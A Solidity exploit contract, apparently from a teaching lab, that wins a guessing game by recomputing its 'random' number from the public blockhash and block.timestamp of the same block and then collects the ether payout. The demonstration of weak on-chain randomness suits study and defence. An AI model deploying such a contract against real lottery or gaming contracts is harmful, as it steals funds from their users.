//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Game.sol";

contract Attack {
    game Game;

    //Creating an instance of Game contract with the help of 'gameAddress'

    constructor(address gameAddress) {
        Game = game(gameAddress);
    }

    /**
 attack the Game contract by guessing the exact number because blockhash and block.timestamp is accessible public
  */

    function attack() public {
        // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
        // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
        // which is further converted to a `uint`.
        // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
        uint256 _guess = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number), block.timestamp)
            )
        );
        Game.guess(_guess);
    }

    //Gets called when the contract recieves ether
    receive() external payable {}
}
